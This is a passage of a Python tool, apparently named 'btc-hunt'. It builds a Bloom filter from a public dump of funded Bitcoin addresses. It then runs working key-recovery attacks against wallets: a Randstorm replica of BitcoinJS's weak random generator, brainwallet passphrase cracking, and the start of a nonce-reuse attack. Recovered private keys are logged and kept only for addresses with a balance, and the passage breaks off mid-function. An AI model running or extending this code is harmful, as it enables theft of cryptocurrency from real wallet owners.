        with open(path, 'wb') as f:
            f.write(struct.pack('<QQ', self.m, self.k))
            f.write(self.bits)

    @classmethod
    def load(cls, path):
        with open(path, 'rb') as f:
            m, k = struct.unpack('<QQ', f.read(16))
            bf = cls(m, k)
            bf.bits = bytearray(f.read())
        return bf


# ════════════════════════════════════════════════════════════════════
# DATASET
# ════════════════════════════════════════════════════════════════════
def _download(url, dest, log, progress=None, should_stop=None, deadline=None):
    # Stream into a .part file so a failed 1.5 GB transfer never leaves a
    # truncated dataset that later looks "already downloaded".
    log(f"[dl] {url}")
    if deadline is None:
        deadline = time.time() + 600
    tmp = Path(str(dest) + ".part")
    try:
        # Some mirrors reject the default python-requests User-Agent.
        r = requests.get(url, stream=True, timeout=(15, 60),
                         headers={"User-Agent":
                                  "Mozilla/5.0 (compatible; btc-hunt/1.0)",
                                  # Never let requests transparently decompress the
                                  # .gz file into a corrupt "dataset".
                                  "Accept-Encoding": "identity"})
        r.raise_for_status()
        total = int(r.headers.get('content-length', 0))
        done = 0; last = 0
        with open(tmp, 'wb') as f:
            for chunk in r.iter_content(1 << 20):
                if should_stop and should_stop():
                    raise RuntimeError("cancelled")
                if time.time() > deadline:
                    raise RuntimeError("download exceeded its time budget")
                f.write(chunk); done += len(chunk)
                if total and done - last > 50 << 20:
                    last = done
                    log(f"[dl] {done/1e9:.2f}/{total/1e9:.2f} GB")
                    if progress:
                        progress(0.05 + 0.20 * min(done / total, 1.0),
                                 f"downloading {done/1e9:.2f}/{total/1e9:.2f} GB")
        if not done:
            raise RuntimeError("mirror returned an empty response")
        with open(tmp, 'rb') as fh:
            if fh.read(2) != b'\x1f\x8b':
                raise RuntimeError("mirror returned non-gzip content (HTML error page?)")
        tmp.replace(dest)
        log(f"[✓] downloaded {done/1e9:.2f} GB")
        if progress:
            progress(0.25, "download complete")
        return True
    except Exception as e:
        log(f"[!] {url}: {e}")
        tmp.unlink(missing_ok=True)
        if str(e) in ("cancelled", "download exceeded its time budget"):
            raise  # stop / expired budget: do not silently try the next mirror
        return False


def _loyce_dated_urls(log, should_stop=None):
    """LoyceV disabled its LATEST direct downloads in 2026 but still links
    dated snapshots from its index. Discover the newest few so the fallback
    list does not go stale every time the date changes. Torrent is not used:
    it would require a BitTorrent client and inbound peer ports on EC2.
    """
    if should_stop and should_stop():
        raise RuntimeError("cancelled")
    try:
        r = requests.get(LOYCE_INDEX, timeout=(10, 20), headers={
            "User-Agent": "Mozilla/5.0 (compatible; btc-hunt/1.0)"})
        r.raise_for_status()
        scored = []
        for href in re.findall(r'href="([^"]+\.gz)"', r.text, re.I):
            m = re.search(
                r'(Bitcoin_addresses|blockchair_bitcoin_addresses_and_balance)'
                r'_([A-Za-z]+)_(\d{1,2})_(\d{4})\.(txt|tsv)\.gz$', href)
            if not m:
                continue
            try:
                ts = datetime.strptime(
                    f"{m.group(2)} {m.group(3)} {m.group(4)}", "%B %d %Y").timestamp()
            except ValueError:
                continue
            kind = ("balance" if m.group(1) ==
                    "blockchair_bitcoin_addresses_and_balance" else "text")
            scored.append((ts, kind, urljoin(LOYCE_INDEX, href)))
        scored.sort(key=lambda t: t[0], reverse=True)
        balance_urls = [u for _, k, u in scored if k == "balance"]
        text_urls = [u for _, k, u in scored if k == "text"]
        if DATASET_PREFER_BALANCE_TSV:
            primary, secondary = balance_urls, text_urls
            label = "balance TSV preferred"
        else:
            primary, secondary = text_urls, balance_urls
            label = "text dump preferred"
        # Try up to four primary snapshots first, then fill the remaining
        # slots with the other type so a blocked TSV still has a text fallback.
        urls, seen = [], set()
        for u in primary[:4] + secondary:
            if u in seen:
                continue
            seen.add(u); urls.append(u)
            if len(urls) >= 6:
                break
        if urls:
            log(f"[dl] LoyceV index: {len(urls)} dated snapshot(s) found ({label})")
        return urls
    except RuntimeError:
        raise
    except Exception as e:
        log(f"[dl] LoyceV index unavailable: {e}")
        return []


def _decode_hash(token):
    """Accept a base58/bech32 address OR a 40-char hash160 hex string."""
    h = _address_to_hash160(token)
    if h:
        return h
    t = token[2:] if token.lower().startswith("0x") else token
    if len(t) == 40:
        try:
            b = bytes.fromhex(t)
            if len(b) == 20:
                return b
        except ValueError:
            pass
    return None


HEX_LETTERS = frozenset("abcdefABCDEF")


def _parse_balance(token):
    """Return a numeric balance from a TSV column, or None if it isn't one."""
    t = token.strip().replace(",", "")
    try:
        return float(t)
    except ValueError:
        pass
    # Tolerate units / trailing text such as "123.45 BTC".
    m = re.match(r"^[+-]?(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?", t)
    try:
        return float(m.group(0)) if m else None
    except ValueError:
        return None


def _hex_to_hash(token):
    """40-char hash160 hex, optionally 0x-prefixed. Avoid decoding a 40-digit
    decimal balance as hex: unprefixed all-digit tokens are rejected."""
    prefixed = token[:2].lower() == "0x"
    t = token[2:] if prefixed else token
    if len(t) != 40 or (not prefixed and t.isdecimal()):
        return None
    try:
        b = bytes.fromhex(t)
    except ValueError:
        return None
    return b if len(b) == 20 else None


def _address_to_hash160_fast(addr):
    """Dataset-optimised decoder. Skips per-row checksum hashing for trusted
    public dumps, but still checks length/version/charset. Set
    DATASET_VERIFY_CHECKSUM=1 for full Base58Check and bech32 validation.
    """
    if not addr:
        return None
    if addr[:3].lower() == "bc1":
        if len(addr) > 90:
            return None
        if DATASET_VERIFY_CHECKSUM:
            return _address_to_hash160(addr)
        data = _bech32_decode_fast(addr)
        if data:
            prog = _convertbits(data[1:], 5, 8, pad=False)
            if len(prog) == 20:
                return bytes(prog)
        return None
    if len(addr) > 40:
        return None
    if addr[0] in "13":
        try:
            n = 0
            for c in addr:
                n = n * 58 + B58_MAP[c]
            raw = n.to_bytes((n.bit_length() + 7) // 8, 'big')
            pad = len(addr) - len(addr.lstrip('1'))
            raw = b'\x00' * pad + raw
        except (KeyError, ValueError, OverflowError):
            return None
        if len(raw) != 25 or raw[0] not in (0, 5):
            return None
        if DATASET_VERIFY_CHECKSUM and sha256d(raw[:21])[:4] != raw[21:]:
            return None
        return raw[1:21]
    return None


def _sniff_dataset_format(path, sample_lines=2000):
    """Decide once which decoder the 51M-row hot loop should use."""
    hex_hits = addr_hits = 0
    with gzip.open(path, 'rt', errors='ignore') as f:
        for i, line in enumerate(f):
            if i >= sample_lines:
                break
            for token in line.rstrip('\r\n').split('\t'):
                t = token.strip()
                if not t:
                    continue
                if _hex_to_hash(t):
                    hex_hits += 1
                elif _address_to_hash160_fast(t):
                    addr_hits += 1
    if hex_hits and addr_hits:
        return "mixed"
    if hex_hits:
        return "hex"
    if addr_hits:
        return "address"
    return "generic"


def build_bloom(log, progress=None, should_stop=None, urls=None):
    # Two streaming passes over the gzip: pass 1 sizes the bloom from the row
    # count, pass 2 fills it directly. Holding every hash160 in a Python set
    # needs several GB and gets OOM-killed on a small instance.
    deadline = time.time() + BUILD_DEADLINE_SECS
    download_deadline = min(deadline, time.time() + DOWNLOAD_DEADLINE_SECS)

    def report(frac, detail):
        if progress:
            progress(frac, detail)

    def check():
        if should_stop and should_stop():
            raise RuntimeError("cancelled")
        if time.time() > deadline:
            raise RuntimeError("dataset build exceeded its time budget")

    if urls is None:
        sources = list(DATASET_URLS)
        # Only scrape the index when a download is actually needed; a cached
        # .gz must build completely offline.
        if not ADDR_GZ.exists():
            check()
            dated = _loyce_dated_urls(log, should_stop)
            if dated:
                # LoyceV dated snapshots are the source proven to work from
                # EC2. Try them immediately after any user-supplied URLs and
                # before privatekeyfinder.io / throttled Blockchair.
                i = min(len(_CUSTOM_DATASET_URLS), len(sources))
                sources[i:i] = dated
    else:
        sources = list(urls)
    if not ADDR_GZ.exists():
        report(0.02, "downloading dataset")
        log(f"[dl] {len(sources)} mirror(s) configured")
        log(f"[dl] download budget {DOWNLOAD_DEADLINE_SECS}s; "
            f"build budget {BUILD_DEADLINE_SECS}s")
        ok = False
        for u in sources:
            check()
            if _download(u, ADDR_GZ, log, progress, should_stop, download_deadline):
                ok = True; break
        if not ok:
            raise RuntimeError(
                f"all {len(sources)} dataset mirrors failed — paste a working "
                f".gz URL above, set DATASET_URLS, or place the file at {ADDR_GZ}")
    else:
        report(0.25, "dataset already downloaded")

    try:
        fmt = _sniff_dataset_format(ADDR_GZ)
    except Exception as e:
        log(f"[parse] format sniff failed: {e}; using generic parser")
        fmt = "generic"
    log(f"[parse] format: {fmt}")
    if DATASET_MIN_BALANCE > -1:
        log(f"[parse] balance filter: keep rows with balance > {DATASET_MIN_BALANCE:g}")
    else:
        log("[parse] balance filter: disabled (DATASET_MIN_BALANCE <= -1)")

    def hashes():
        # A Python set of 50.8M 20-byte hash160 values needs several GB and
        # OOM-kills a c6i.large. Keep the two-pass streaming Bloom filter and
        # apply the requested balance > threshold filter here instead.
        if fmt == "hex":
            decode = _hex_to_hash
        elif fmt == "address":
            decode = _address_to_hash160_fast
        elif fmt == "mixed":
            decode = lambda t: _hex_to_hash(t) or _address_to_hash160_fast(t)
        else:
            decode = _decode_hash
        with gzip.open(ADDR_GZ, 'rt', errors='ignore') as f:
            for line in f:
                tokens = line.rstrip('\r\n').split('\t')
                h = None
                hash_idx = -1
                for idx, token in enumerate(tokens):
                    cand = decode(token.strip())
                    if cand:
                        h, hash_idx = cand, idx
                        break
                if not h:
                    continue  # header, blank or unparseable row
                # Only TSV-ish rows have a balance column. Plain address lists
                # and hex dumps have one token and are kept as-is. Works for
                # address<TAB>balance and balance<TAB>address layouts.
                if len(tokens) > 1 and DATASET_MIN_BALANCE > -1:
                    for idx, token in enumerate(tokens):
                        if idx == hash_idx:
                            continue
                        bal = _parse_balance(token)
                        if bal is None:
                            continue
                        if bal <= DATASET_MIN_BALANCE:
                            h = None
                        break
                if h:
                    yield h

    log("[parse] pass 1/2 — counting address rows")
    report(0.30, "pass 1/2 — counting address rows")
    n = 0
    for _ in hashes():
        n += 1
        if n % 100000 == 0:
            check()  # time.time()/stop check per row was a large overhead
        if n % 1000000 == 0:
            log(f"[parse] pass 1 — {n/1e6:.1f}M rows counted")
            report(0.30 + 0.05 * min(n / 100_000_000, 1.0),
                   f"pass 1/2 — {n/1e6:.1f}M rows counted")
    check()
    log(f"[parse] {n:,} rows — sizing bloom")
    if not n:
        raise RuntimeError("dataset contains no usable addresses")
    bf = BloomFilter.create(n, fp_rate=BLOOM_FP_RATE)
    log(f"[parse] bloom target FP rate {BLOOM_FP_RATE:g}")

    log(f"[parse] pass 2/2 — filling bloom ({bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
    report(0.35, "pass 2/2 — filling bloom")
    i = 0
    for h in hashes():
        bf.add(h); i += 1
        if i % 100000 == 0:
            check()
        if i % 500000 == 0:
            log(f"[parse] {i/1e6:.1f}M/{n/1e6:.1f}M addresses")
            report(0.35 + 0.60 * min(i / n, 1.0),
                   f"pass 2/2 — {i/1e6:.1f}M/{n/1e6:.1f}M addresses")
    check()
    bf.save(BLOOM_PATH)
    log(f"[✓] bloom saved ({BLOOM_PATH.stat().st_size/1e6:.0f} MB, "
        f"{bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
    report(1.0, f"done — {n/1e6:.1f}M addresses indexed")
    return bf

def _address_to_hash160(addr):
    """Extract 20-byte hash160 from P2PKH/P2SH/Bech32 address string."""
    try:
        if addr.startswith('1') or addr.startswith('3'):
            raw = _b58decode(addr)
            if len(raw) == 25 and sha256d(raw[:21])[:4] == raw[21:]:
                return raw[1:21]
        elif addr.lower().startswith('bc1'):
            data = _bech32_decode(addr)
            if data:
                prog = _convertbits(data[1:], 5, 8, pad=False)
                if len(prog) == 20: return bytes(prog)
    except Exception:
        pass
    return None

def _b58decode(s):
    n = 0
    for c in s:
        n = n * 58 + B58_MAP[c]
    raw = n.to_bytes((n.bit_length()+7)//8, 'big')
    pad = len(s) - len(s.lstrip('1'))
    return b'\x00'*pad + raw

def _bech32_decode(addr):
    addr = addr.lower()
    pos = addr.rfind('1')
    if pos < 1: return None
    data = [BECH32_MAP.get(c, -1) for c in addr[pos+1:]]
    if -1 in data: return None
    hrp = addr[:pos]
    if _bech32_polymod(_bech32_hrp_expand(hrp) + data) != 1:
        return None
    return data[:-6]


def _bech32_decode_fast(addr):
    """Trusted-dump decoder: validate charset/hrp/length, skip polymod checksum."""
    addr = addr.lower()
    pos = addr.rfind('1')
    if pos < 1 or addr[:pos] != 'bc':
        return None
    data = [BECH32_MAP.get(c, -1) for c in addr[pos+1:]]
    if -1 in data or len(data) < 7:
        return None
    return data[:-6]


# ════════════════════════════════════════════════════════════════════
# ATTACK 1 — RANDSTORM
# ════════════════════════════════════════════════════════════════════
class MWC1616:
    """V8-era Math.random replica (MWC1616)."""
    def __init__(self, seed):
        self.s0 = seed & 0xFFFFFFFF
        self.s1 = (seed ^ 0x5DEECE66D) & 0xFFFFFFFF
    def next(self):
        self.s0 = (18030 * (self.s0 & 0xFFFF) + (self.s0 >> 16)) & 0xFFFFFFFF
        self.s1 = (36969 * (self.s1 & 0xFFFF) + (self.s1 >> 16)) & 0xFFFFFFFF
        return ((self.s1 << 16) + self.s0) & 0xFFFFFFFF

def _rc4_init(key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S

def _rc4_bytes(S, n):
    i = j = 0; out = bytearray()
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def _bitcoinjs_securerandom(seed_ms):
    """Replicate BitcoinJS-lib v0.1.3 SecureRandom.nextBytes(32)."""
    rng = MWC1616(seed_ms)
    pool = bytearray(256)
    pptr = 0
    while pptr < 256:
        t = int(65536 * (rng.next() / 4294967296.0))
        pool[pptr] = (t >> 8) & 0xFF; pptr += 1
        if pptr < 256:
            pool[pptr] = t & 0xFF; pptr += 1
    pptr = 0
    def seed_int(x):
        nonlocal pptr
        for shift in (0, 8, 16, 24):
            pool[pptr] ^= (x >> shift) & 0xFF
            pptr = (pptr + 1) % 256
    seed_int(seed_ms); seed_int(seed_ms)
    # getByte initialises ArcFour with pool and seeds again
    seed_int(seed_ms); seed_int(seed_ms)
    S = _rc4_init(pool)
    return _rc4_bytes(S, 32)

def _randstorm_chunks(start_ms, end_ms, chunk_ms):
    """Yield inclusive [start, end] chunks no larger than chunk_ms."""
    step = max(1, int(chunk_ms))
    start = int(start_ms)
    while start <= end_ms:
        end = min(int(end_ms), start + step - 1)
        yield start, end
        start = end + 1


def _human_secs(secs):
    """A duration a human can act on — including the absurd ones honestly."""
    try:
        secs = float(secs)
    except (TypeError, ValueError):
        return "?"
    if secs != secs or secs in (float("inf"), float("-inf")):
        return "?"
    if secs < 90:
        return "%.0f s" % secs
    if secs < 5400:
        return "%.1f min" % (secs / 60)
    if secs < 129600:
        return "%.1f h" % (secs / 3600)
    if secs < 63072000:
        return "%.1f days" % (secs / 86400)
    years = secs / 31557600
    return ("%s years" % format(int(round(years)), ",") if years < 1e6
            else "%.3g years" % years)


def _batch_count(total, batch):
    """How many batches a run of `total` items needs at `batch` per batch."""
    return max(1, -(-int(total) // max(1, int(batch))))


def _batch_note(total, batch, noun="steps", rate=None):
    """The sentence that replaces every "range too large" refusal.

    No range is rejected any more. A run larger than one batch is split and the
    batches run one after another — which is all the old cap ever bought, minus
    the dead end. This says how many batches there are and, when a rate is
    known, how long that will actually take, so the number is informative
    instead of blocking.
    """
    total = int(total)
    n = _batch_count(total, batch)
    out = ("%s %s in %s batch%s of %s — batches run one after another; Stop "
           "between them keeps everything found so far"
           % (format(total, ","), noun, format(n, ","),
              "" if n == 1 else "es", format(int(batch), ",")))
    if rate:
        out += " (≈%s at %s/s)" % (_human_secs(total / rate),
                                   format(int(rate), ","))
    return out


def attack_randstorm(start_ms, end_ms, bf, log, job):
    """Iterate a range in capped chunks, derive keys, live-check candidates."""
    total = int(end_ms) - int(start_ms) + 1
    if total <= 0:
        return []
    # ceil-division, not list(...): with the 4-billion-ms cap a small
    # RANDSTORM_MAX_MS would otherwise allocate millions of chunk tuples.
    chunk_count = -(-total // max(1, RANDSTORM_MAX_MS))
    log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps "
        f"\u2248 {total / _MS_PER_DAY:.1f} days, {chunk_count:,} chunk(s) of at "
        f"most {RANDSTORM_MAX_MS:,} ms)  EC: {EC_BACKEND}")
    hits = []; skipped = 0; t0 = time.time(); base_done = 0
    for chunk_no, (chunk_start, chunk_end) in enumerate(
            _randstorm_chunks(start_ms, end_ms, RANDSTORM_MAX_MS), 1):
        if job["stop"]:
            log("[randstorm] stopped")
            break
        chunk_total = chunk_end - chunk_start + 1
        log(f"[randstorm] chunk {chunk_no}/{chunk_count}: {chunk_start}..{chunk_end} "
            f"({chunk_total:,} timestamps)")
        for i, ts in enumerate(range(chunk_start, chunk_end + 1)):
            if job["stop"]:
                log("[randstorm] stopped")
                break
            try:
                pk = int.from_bytes(_bitcoinjs_securerandom(ts), 'big') % N
                if pk == 0: continue
                for label, h, pub in derive_candidates(pk):
                    if h in bf:
                        addr = encode_address(label, pub)
                        hit = {"ts": ts, "privkey": hex(pk), "address": addr,
                               "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
                        save, hit, note = _balance_gate(
                            hit, log, job, lambda: job["stop"])
                        if not save:
                            if note == "stopped":
                                log("[randstorm] stopped")
                                return hits
                            skipped += 1
                            continue
                        hits.append(hit)
                        log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}  {note}")
                        _save_result("randstorm", hit)
            except Exception:
                pass
            if i % 500 == 0 or i == chunk_total - 1:
                done = base_done + i + 1
                elapsed = max(time.time() - t0, 0.001)
                rate = done / elapsed
                eta = (total - done) / max(rate, 0.001)
                job["progress"] = done / total
                job["detail"] = (f"{done:,}/{total:,} ts  chunk {chunk_no}/{chunk_count}  "
                                 f"{rate:.0f} ts/s  hits={len(hits)}  skipped={skipped}  "
                                 f"eta ~{eta/60:.1f} min")
        base_done += chunk_total
    log(f"[randstorm] done — {len(hits)} hits, "
        f"{skipped} zero-balance candidate(s) skipped")
    return hits


# ════════════════════════════════════════════════════════════════════
# ATTACK 2 — BRAINWALLET
# ════════════════════════════════════════════════════════════════════
def attack_brainwallet(passphrases, bf, log, job):
    hits = []; skipped = 0; total = len(passphrases); t0 = time.time()
    log(f"[brain] {total:,} passphrases  EC: {EC_BACKEND}")
    for i, pw in enumerate(passphrases):
        if job["stop"]: break
        try:
            pk = int.from_bytes(sha256(pw.encode('utf-8')), 'big') % N
            if pk == 0: continue
            for label, h, pub in derive_candidates(pk):
                if h in bf:
                    addr = encode_address(label, pub)
                    hit = {"passphrase": pw, "privkey": hex(pk),
                           "address": addr, "type": label,
                           "found_at": datetime.now(timezone.utc).isoformat()}
                    save, hit, note = _balance_gate(
                        hit, log, job, lambda: job["stop"])
                    if not save:
                        if note == "stopped":
                            log("[brain] stopped")
                            return hits
                        skipped += 1
                        continue
                    hits.append(hit); _save_result("brainwallet", hit)
                    log(f"  ★★★ HIT {addr}  pw={pw!r}  {note}")
        except Exception:
            pass
        if i % 200 == 0:
            rate = (i + 1) / max(time.time() - t0, 0.001)
            job["progress"] = (i + 1) / total
            job["detail"] = (f"{i+1:,}/{total:,}  {rate:.0f} pw/s  "
                             f"hits={len(hits)}  skipped={skipped}")
    log(f"[brain] done — {len(hits)} hits, "
        f"{skipped} zero-balance candidate(s) skipped")
    return hits


# ════════════════════════════════════════════════════════════════════
# ATTACK 3 — NONCE REUSE
# ════════════════════════════════════════════════════════════════════
# ── Esplora access: pacing, bounded cache, adaptive 429 cooldown ────────
class _EsploraRateLimited(RuntimeError):
    """A 429/5xx that must reach the bulk runner as 'unchecked', not 0 hits."""

_ESPLORA_CACHE = OrderedDict()
_ESPLORA_CACHE_LOCK = threading.Lock()
# Shared by every request in the process. A 429 sets a deadline that ALL
# later requests wait for, so one rate limit cannot cascade into 3,000
# instant failures. Stop remains responsive during those waits.
_RATE_LOCK = threading.Lock()
_RATE_NEXT = [0.0]
_RATE_INTERVAL = [ESPLORA_MIN_INTERVAL]
_RATE_FAILURES = [0]
# Per-endpoint cooldowns. Throttling ONE public instance must not stall the
# others: a 429 from blockstream.info parks that base only, and the next
# attempt goes to mempool.space while the global spacing still slows down.
_BASE_COOL = {}
_BASE_FAILS = {}

def _esplora_cache_get(path):
    if ESPLORA_CACHE_SIZE <= 0:
        return None
    with _ESPLORA_CACHE_LOCK:
        if path not in _ESPLORA_CACHE:
            return None
        _ESPLORA_CACHE.move_to_end(path)
        return _ESPLORA_CACHE[path]

def _esplora_cache_clear():
    with _ESPLORA_CACHE_LOCK:
        _ESPLORA_CACHE.clear()

def _esplora_cache_put(path, text):
    if ESPLORA_CACHE_SIZE <= 0:
        return
    with _ESPLORA_CACHE_LOCK:
        _ESPLORA_CACHE[path] = text
        _ESPLORA_CACHE.move_to_end(path)
        while len(_ESPLORA_CACHE) > ESPLORA_CACHE_SIZE:
            _ESPLORA_CACHE.popitem(last=False)

def _esplora_sleep(seconds, should_stop=None):
    """Interruptible sleep so Stop still works during a long 429 cooldown."""
    end = time.monotonic() + max(0.0, seconds)
    while True:
        if should_stop and should_stop():
            raise RuntimeError("stopped by user")
        left = end - time.monotonic()
        if left <= 0:
            return
        time.sleep(min(0.25, left))

def _esplora_pace(should_stop=None):
    with _RATE_LOCK:
        wait = _RATE_NEXT[0] - time.monotonic()
        interval = _RATE_INTERVAL[0]
    _esplora_sleep(wait, should_stop)
    with _RATE_LOCK:
        _RATE_NEXT[0] = max(_RATE_NEXT[0], time.monotonic()) + interval

def _retry_after_seconds(response):
    v = response.headers.get("Retry-After") if response is not None else None
    if not v:
        return 0.0
    try:
        return max(0.0, float(v.strip()))
    except (TypeError, ValueError):
        pass
    try:
        from email.utils import parsedate_to_datetime
        dt = parsedate_to_datetime(v)
        if dt is not None:
            return max(0.0, dt.timestamp() - time.time())
    except Exception:
        pass
    return 0.0

_ESPLORA_HEADERS = {"Accept": "application/json"}

def _esplora_headers():
    """Identify ourselves: a stock python-requests UA is throttled harder.

    Built lazily because BUILD_ID is resolved after this config section.
    """
    if "User-Agent" not in _ESPLORA_HEADERS:
        _ESPLORA_HEADERS["User-Agent"] = (
            os.environ.get("ESPLORA_USER_AGENT", "").strip()
            or f"btc-hunt/{BUILD_ID} (github.com/Phaviwylera/edurep)")
    return _ESPLORA_HEADERS

def _esplora_host(base):
    return base.split("//")[-1].split("/")[0]

def _esplora_throttled(base, response):
    """Park ONE endpoint after a 429/5xx and slow the global spacing down.

    Returns the cooldown in seconds. The other bases stay usable, so a single
    throttled public instance no longer freezes a whole verify pass.
    """
    hint = _retry_after_seconds(response)
    now = time.monotonic()
    with _RATE_LOCK:
        _RATE_FAILURES[0] += 1
        n = _BASE_FAILS[base] = _BASE_FAILS.get(base, 0) + 1
        backoff = min(ESPLORA_MAX_BACKOFF_SECS,
                      max(hint, 2.0 * (2 ** min(n - 1, 5))))
        _BASE_COOL[base] = max(_BASE_COOL.get(base, 0.0), now + backoff)
        floor = max(ESPLORA_MIN_INTERVAL, 0.25)
        _RATE_INTERVAL[0] = min(ESPLORA_PACE_MAX_SECS,
                                max(_RATE_INTERVAL[0], floor) * 2)
        return backoff

def _esplora_rate_ok(base=None):
    with _RATE_LOCK:
        _RATE_FAILURES[0] = 0
        if base:
            _BASE_FAILS[base] = 0
            _BASE_COOL.pop(base, None)
        if _RATE_INTERVAL[0] > ESPLORA_MIN_INTERVAL:
            _RATE_INTERVAL[0] = max(ESPLORA_MIN_INTERVAL,
                                    _RATE_INTERVAL[0] * 0.8)

def _esplora_ready(bases=None):
    """Bases that are not cooling down right now.

    `bases` defaults to the Esplora list; the Ethereum RPC client passes its
    own. The cooldown table is keyed by URL, so both share one politeness
    budget for pacing while parking endpoints independently.
    """
    bases = _ESPLORA_BASES if bases is None else bases
    now = time.monotonic()
    with _RATE_LOCK:
        return [b for b in bases if _BASE_COOL.get(b, 0.0) <= now]

def _esplora_wait_for_base(should_stop=None, bases=None):
    """Block (Stop-aware) until at least one endpoint is out of cooldown."""
    bases = _ESPLORA_BASES if bases is None else bases
    while True:
        ready = _esplora_ready(bases)
        if ready:
            return ready
        now = time.monotonic()
        with _RATE_LOCK:
            left = min(_BASE_COOL.get(b, 0.0) - now for b in bases)
        _esplora_sleep(min(max(left, 0.0), ESPLORA_MAX_BACKOFF_SECS),
                       should_stop)

def _esplora_pick(ready, avoid=None):
    """Prefer an endpoint other than the one that just failed."""
    if avoid and len(ready) > 1:
        for b in ready:
            if b != avoid:
                return b
    return ready[0]

def _esplora_status(bases=None):
    """One-line per-endpoint state for the log and the /results page."""
    bases = _ESPLORA_BASES if bases is None else bases
    now = time.monotonic()
    with _RATE_LOCK:
        parts = []
        for b in bases:
            left = _BASE_COOL.get(b, 0.0) - now
            parts.append(f"{_esplora_host(b)}: cooling {left:.0f}s"
                         if left > 0 else f"{_esplora_host(b)}: ok")
        return "  ".join(parts)

def _esplora_get(path, should_stop=None):
    """GET one Esplora path: cache, pacing, 429 cooldown, endpoint rotation."""
    hit = _esplora_cache_get(path)
    if hit is not None:
        return hit
    last_err = None
    failed_base = None
    for attempt in range(ESPLORA_MAX_RETRIES + 1):
        if should_stop and should_stop():
            raise RuntimeError("stopped by user")
        # Wait for whichever endpoint is usable, and never retry the base
        # that just throttled us while another one is still answering.
        ready = _esplora_wait_for_base(should_stop)
        base = _esplora_pick(ready, failed_base)
        _esplora_pace(should_stop)
        try:
            r = requests.get(f"{base}{path}", timeout=25,
                             headers=_esplora_headers())
            if r.status_code == 429 or r.status_code >= 500:
                cool = _esplora_throttled(base, r)
                failed_base = base
                nxt = _esplora_pick(_esplora_ready() or [base], base)
                last_err = _EsploraRateLimited(
                    f"HTTP {r.status_code} from {_esplora_host(base)} — "
                    f"cooling {cool:.0f}s"
                    + (f", failing over to {_esplora_host(nxt)}"
                       if nxt != base else ""))
                continue
            r.raise_for_status()
            text = r.text
        except RuntimeError as e:
            if "stopped by user" in str(e):
                raise
            last_err = e
            continue
        except Exception as e:
            last_err = e
            continue
        _esplora_rate_ok(base)
        _esplora_cache_put(path, text)
        return text
    if isinstance(last_err, _EsploraRateLimited):
        raise last_err
    raise RuntimeError(
        f"Esplora request failed after {ESPLORA_MAX_RETRIES + 1} attempt(s): {last_err}")

_ADDR_B58 = re.compile(r"^[13][1-9A-HJ-NP-Za-km-z]{24,34}$")
# bech32 data charset: 0, 2-9 and letters except 1, b, i, o.
_ADDR_BECH32 = re.compile(r"^bc1[02-9ac-hj-np-z]{11,71}$")

def _normalise_address(addr):
    """Trim and lowercase an all-uppercase bech32 address."""
    a = (addr or "").strip()
    if a.upper() == a and a.lower().startswith("bc1"):
        a = a.lower()
    return a

def _valid_address(addr):
    """Loose syntax check for mainnet Base58Check and bech32/bech32m addresses.

    The old [1-9A-HJ-NP-Za-km-z]{2,90} regex rejected many valid bc1
    addresses because the bech32 charset contains 0 but not 1, b, i or o.
    Checksum verification is left to the API/parser.
    """
    a = _normalise_address(addr)
    return bool(_ADDR_B58.fullmatch(a) or _ADDR_BECH32.fullmatch(a))

def _parse_address_lines(data):
    """Return (unique_addresses, skipped_lines, duplicate_lines).

    Accepts one address per line, or a CSV/TSV whose first column is the
    address. Blank lines and # comments are ignored; anything after the
    first column (balance, label, ...) is ignored.
    """
    addresses, seen = [], set()
    skipped = duplicates = 0
    for raw in (data or "").splitlines():
        line = raw.replace("\ufeff", "").strip()
        if not line or line.startswith("#"):
            continue
        token = re.split(r"[\s,;|\t]+", line, maxsplit=1)[0].strip().strip("\"'")
        token = _normalise_address(token)
        if not _valid_address(token):
            skipped += 1
            continue
        if token in seen:
            duplicates += 1
            continue
        seen.add(token)
        addresses.append(token)
    return addresses, skipped, duplicates

def _parse_der_sig(sig):
    """Return (r, s, sighash_type) or None."""
    if len(sig) < 9 or sig[0] != 0x30: return None
    try:
        i = 2
        if sig[i] != 0x02: return None
        rlen = sig[i+1]; r = int.from_bytes(sig[i+2:i+2+rlen], 'big')
        i += 2 + rlen
        if sig[i] != 0x02: return None
        slen = sig[i+1]; s = int.from_bytes(sig[i+2:i+2+slen], 'big')
        i += 2 + slen
        htype = sig[i] if i < len(sig) else 1
        return r, s, htype
    except Exception:
        return None

def _legacy_sighash(raw_tx, input_idx, prevout_script, htype=1):
    """Bitcoin legacy SIGHASH_ALL computation."""
    try:
        # parse tx
        def varint(b, p):
            n = b[p]; p += 1
            if n < 0xfd: return n, p
            if n == 0xfd: return int.from_bytes(b[p:p+2],'little'), p+2
            if n == 0xfe: return int.from_bytes(b[p:p+4],'little'), p+4
            return int.from_bytes(b[p:p+8],'little'), p+8
        p = 0; version = raw_tx[p:p+4]; p += 4
        n_in, p = varint(raw_tx, p)
        ins = []
        for _ in range(n_in):
            start = p
            p += 36  # prev txid + vout
            slen, p = varint(raw_tx, p)
            script = raw_tx[p:p+slen]; p += slen
            seq = raw_tx[p:p+4]; p += 4
            ins.append((raw_tx[start:start+36], script, seq))
        n_out, p = varint(raw_tx, p)
        outs = []
        for _ in range(n_out):
            val = raw_tx[p:p+8]; p += 8
            slen, p = varint(raw_tx, p)
            script = raw_tx[p:p+slen]; p += slen
            outs.append((val, script))
        locktime = raw_tx[p:p+4]
        # replace scriptSig of input_idx with prevout_script, others empty
        out = bytearray(version)
        def put_varint(n):
            if n < 0xfd: return bytes([n])
            if n <= 0xffff: return b'\xfd' + n.to_bytes(2,'little')
            if n <= 0xffffffff: return b'\xfe' + n.to_bytes(4,'little')
            return b'\xff' + n.to_bytes(8,'little')
        out += put_varint(n_in)
        for i, (prev, script, seq) in enumerate(ins):
            out += prev
            use = prevout_script if i == input_idx else b''
            out += put_varint(len(use)) + use + seq
